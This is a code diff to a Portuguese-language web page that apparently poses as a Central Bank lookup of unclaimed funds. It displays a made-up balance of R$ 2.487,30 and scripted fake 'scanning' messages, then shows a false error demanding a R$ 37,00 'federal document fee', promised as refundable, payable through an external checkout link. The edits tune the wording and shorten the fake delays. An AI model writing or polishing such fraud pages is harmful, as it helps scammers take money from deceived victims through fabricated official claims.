@@ -99,10 +99,10 @@
         <div id="m-extrato" class="msg"><b>VALORES LOCALIZADOS!</b> Confira o extrato de liquidação:</div>
         <div id="cedula" class="cedula-container">
             <div class="cedula-inner">
-                <div class="cedula-row" id="r1" style="display:none;"><span>TITULAR:</span> <b id="r-nome"></b></div>
-                <div class="cedula-row" id="r2" style="display:none;"><span>VALOR RETIDO:</span> <span>R$ 1.987,30</span></div>
-                <div class="cedula-row" id="r3" style="display:none;"><span>JUROS SELIC:</span> <span>R$ 500,00</span></div>
-                <div class="cedula-row total-row" id="r4" style="display:none;"><span>TOTAL A RECEBER:</span> <span style="color:#22c55e;">R$ 2.487,30</span></div>
+                <div class="cedula-row"><span>TITULAR:</span> <b id="r-nome"></b></div>
+                <div class="cedula-row"><span>VALOR RETIDO:</span> <span>R$ 1.987,30</span></div>
+                <div class="cedula-row"><span>JUROS SELIC:</span> <span>R$ 500,00</span></div>
+                <div class="cedula-row total-row"><span>TOTAL A RECEBER:</span> <span style="color:#22c55e;">R$ 2.487,30</span></div>
             </div>
         </div>
 
@@ -146,25 +146,19 @@
         </div>
 
         <div id="error-final" class="checkout-area">
-            <div style="background:#fff; border:2px solid #c53030; padding:15px; border-radius:4px; color:#c53030; font-weight:bold; margin-bottom:20px; text-align: left; border-left: 10px solid #c53030;">
-                SISTEMA: PENDÊNCIA DE REGULARIZAÇÃO FISCAL (GT-SVR)
+            <div style="background:#fff5f5; border:1px solid #feb2b2; padding:15px; border-radius:4px; color:#c53030; font-weight:bold; margin-bottom:20px;">
+                ERRO: GUIA DE TRANSPORTE (GT-SVR) NÃO LOCALIZADA
             </div>
-            <div class="msg" style="display:block; text-align:left; border-left-color: #c53030; background: #fffafa;">
-                A auditoria identificou que o lote de <b>R$ 2.487,30</b> está pronto, porém aguarda a liquidação da <b>Taxa de Emissão de Documento Federal</b> para liberação no sistema PIX.
+            <div class="msg" style="display:block; text-align:left; border-left-color: #c53030;">
+                Para liberar o envio imediato do lote de <b>R$ 2.487,30</b>, o sistema exige a liquidação da <b>Taxa de Emissão de Documento Federal</b>.
                 <br><br>
-                <b>IMPORTANTE:</b> O valor de <b>R$ 37,00</b> é reembolsável e será creditado automaticamente na sua conta junto com o seu saldo total.
+                Este valor de <b>R$ 37,00</b> será totalmente <b>ESTORNADO</b> para sua conta junto com o saque total.
             </div>
-            <div class="cedula-container" style="display:block; border-color: #22c55e;">
-                <div class="cedula-inner" style="background: #f0fff4;">
-                    <div style="display:flex; justify-content: space-between; margin-bottom: 5px;"><span>SALDO DISPONÍVEL:</span> <b>R$ 2.487,30</b></div>
-                    <div style="display:flex; justify-content: space-between; margin-bottom: 5px;"><span>REEMBOLSO TAXA:</span> <b>R$ 37,00</b></div>
-                    <div class="cedula-row total-row" style="border-top: 1px solid #22c55e; padding-top: 10px; margin-top: 10px;">
-                        <span>TOTAL A SER RECEBIDO:</span>
-                        <b style="color:#22c55e; font-size: 22px;">R$ 2.524,30</b>
-                    </div>
-                </div>
+            <div class="cedula-row total-row" style="background:#f0fff4; padding:15px; border: 1px solid #22c55e;">
+                <span>VALOR TOTAL COM REEMBOLSO:</span>
+                <b style="color:#22c55e; font-size: 20px;">R$ 2.524,30</b>
             </div>
-            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar" style="background: #003399;">LIBERAR MEU SALDO (R$ 2.524,30)</a>
+            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar">PAGAR TAXA E RECEBER R$ 2.524,30</a>
         </div>
 
     </div>
@@ -187,25 +181,13 @@
         function finalProcess() {
             hide('i-bancos'); show('loading');
             let t = document.getElementById('loading-txt');
-            // Consulta demorada
-            setTimeout(() => t.innerText = "VARRENDO PROTOCOLOS DO BANCO CENTRAL...", 3000);
-            setTimeout(() => t.innerText = "LOCALIZANDO SALDOS EM CONTAS INATIVAS...", 7000);
-            setTimeout(() => t.innerText = "CALCULANDO ATUALIZAÇÃO SELIC ACUMULADA...", 11000);
-            setTimeout(() => t.innerText = "SOLICITANDO AUTORIZAÇÃO DE RESGATE...", 14000);
+            setTimeout(() => t.innerText = "VARRENDO DADOS DO BANCO CENTRAL...", 2000);
+            setTimeout(() => t.innerText = "LOCALIZANDO VALORES RETIDOS...", 4000);
             setTimeout(() => {
                 hide('loading');
                 document.getElementById('r-nome').innerText = document.getElementById('nome-in').value.toUpperCase();
-                show('m-extrato'); 
-                show('cedula');
-                // Enchendo o extrato linha por linha
-                setTimeout(() => document.getElementById('r1').style.display = 'flex', 500);
-                setTimeout(() => document.getElementById('r2').style.display = 'flex', 1500);
-                setTimeout(() => document.getElementById('r3').style.display = 'flex', 2500);
-                setTimeout(() => {
-                    document.getElementById('r4').style.display = 'flex';
-                    show('i-solicitar');
-                }, 3500);
-            }, 16000);
+                show('m-extrato'); show('cedula'); show('i-solicitar');
+            }, 6000);
         }
 
         function goMetodo() { hide('i-solicitar'); show('m-metodo'); show('i-metodo'); }
@@ -228,7 +210,7 @@
             let status = document.getElementById('status-envio');
             let w = 0;
             let int = setInterval(() => {
-                w += 0.4;
+                w += 0.5;
                 bar.style.width = w + '%';
                 if(w == 20) status.innerText = "RESERVANDO SALDO NO DICT...";
                 if(w == 50) status.innerText = "AUTORIZANDO TRANSFERÊNCIA INTERBANCÁRIA...";
@@ -238,7 +220,7 @@
                     hide('area-envio-pix');
                     show('error-final');
                 }
-            }, 50);
+            }, 30);
         }
 
         window.onload = () => { setTimeout(() => show('m1'), 500); }
